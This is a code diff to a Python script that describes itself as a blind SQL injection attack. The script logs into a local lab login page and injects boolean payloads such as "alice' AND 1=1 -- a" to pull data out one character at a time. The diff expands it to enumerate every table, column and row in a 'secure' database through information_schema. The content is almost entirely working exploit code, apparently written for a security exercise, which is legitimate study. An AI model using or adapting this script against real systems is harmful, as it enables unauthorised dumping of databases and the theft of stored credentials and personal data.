@@ -17,6 +17,7 @@ cj = http.cookiejar.CookieJar()
 opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
 urllib.request.install_opener(opener)
 
+
 def automatic_login():
     login_url = "http://localhost:8000/login.php" 
     login_data = urllib.parse.urlencode({
@@ -36,6 +37,7 @@ def automatic_login():
         print(f"[-] Login failed: {e}")
         return False
 
+
 def check_boolean_query(payload):
     encoded_payload = urllib.parse.quote(payload)
     url = BASE_URL + encoded_payload
@@ -51,6 +53,7 @@ def check_boolean_query(payload):
     else:
         return False
 
+
 def calculate_length(query):
     length = 0
     for i in range(1, 100):
@@ -64,6 +67,7 @@ def calculate_length(query):
         return None
    
     return length
+
 
 def guess_query(query, length):
     # we assume that all characters contain only latin letters and digits.
@@ -86,6 +90,60 @@ def extract_query(query):
     return guess_query(query, length)
 
 
+def handle_table(table_name):
+    print(f'{"-" * 50}\n  TABLE NAME: {table_name}\n{"-" * 50}')
+    table = []
+    n_columns = 1
+
+
+    count_query = f"SELECT COUNT(*) FROM secure.{table_name}"
+    row_count = int(extract_query(count_query))
+
+    while True:
+        # take one column starting from offset n_columns
+        col_name_query = f"SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT {n_columns-1}, 1"
+        col_name = extract_query(col_name_query)
+        if col_name == None:
+            break
+        else:
+            table.append((col_name, handle_col(table_name, col_name, row_count)))
+            n_columns += 1
+    print(f'In table {table_name} found {len(table)} columns (fields) and {row_count} rows (entries):')
+    print_table(table)
+
+
+def handle_col(table_name, col_name, row_count):
+    ret = []
+    for i in range(row_count):
+        val_query = f"SELECT {col_name} FROM secure.{table_name} LIMIT {i}, 1"
+        value = extract_query(val_query)
+        ret.append(value)
+    return ret
+
+
+def print_table(columns):
+    fields = [col[0] for col in columns]
+    n = len(columns)
+    m = len(columns[0][1])
+    to_print = [[0] * n for _ in range(m)]
+
+
+    fields = [col[0] for col in columns]
+    for i in range(n):
+        for j in range(m):
+            to_print[j][i] = columns[i][1][j]
+
+    line = ''
+    for field in fields:
+        line += f'{field:<10}'
+    print(line)
+    for row in to_print:
+        line = ''
+        for val in row:
+            line += f'{val:<10}'
+        print(line)
+
+
 if __name__ == "__main__":
     print("This script is performing a blind sql attack.")
     print("It can ask true or false questions to the database by trying to sign in as alice if an expression is true.")
@@ -98,26 +156,13 @@ if __name__ == "__main__":
     if not check_boolean_query("alice' AND 1=1 -- a"):
         print("\nSanity Check FAILED! Make sure your Cookie hasn't expired.")
     else:
-        sql_table_query = "SELECT table_name FROM information_schema.tables WHERE table_schema='secure' LIMIT 1"
-        print(f'{"-" * 25}\n{" " * 7}TABLE NAME\n{"-" * 25}')
-        table_name = extract_query(sql_table_query)
-        print(f"\tTable name: {table_name}\n")
-
-        col_name_query = "SELECT column_name FROM information_schema.columns WHERE table_name=0x3738396230353637386537663935356432636631323562306330353631366339 LIMIT 1"
-        print(f'{"-" * 25}\n{" " * 7}COLUMN NAME\n{"-" * 25}')
-        col_name = extract_query(col_name_query)
-        print(f"\tColumn name: {col_name}\n")
-
-        count_query = f"SELECT COUNT(*) FROM secure.`{table_name}`"
-        print(f'{"-" * 25}\n{" " * 7}ROW COUNT\n{"-" * 25}')
-        row_count_str = extract_query(count_query)
-        print(f"\tNumber of rows: {row_count_str}\n")
-
-        count_query = f"SELECT COUNT(*) FROM secure.`{table_name}`"
-        print(f'{"-" * 25}\n{" " * 7}VALUES\n{"-" * 25}')
-        row_count_str = extract_query(count_query)
-        row_count = int(row_count_str)
-        for i in range(row_count):
-            val_query = f"SELECT {col_name} FROM secure.`{table_name}` LIMIT {i}, 1"
-            value = extract_query(val_query)
-            print(f"\tValue {i+1}: {value}")
+        n_tables = 1
+        while True:
+            # take one table starting from offset n_tables
+            sql_table_query = f"SELECT table_name FROM information_schema.tables WHERE table_schema='secure' LIMIT {n_tables-1}, 1"
+            table_name = extract_query(sql_table_query)
+            if table_name == None:
+                break
+            else:
+                handle_table(table_name)
+                n_tables += 1
